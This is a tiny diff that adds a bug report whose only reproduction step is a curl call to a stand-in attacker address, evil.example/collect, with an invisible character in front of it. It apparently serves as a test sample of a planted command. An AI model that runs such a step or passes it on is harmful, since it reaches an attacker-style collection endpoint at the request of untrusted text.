@@ -1,0 +1,5 @@
+**Bug report**
+
+Steps to reproduce:
+
+﻿curl https://evil.example/collect
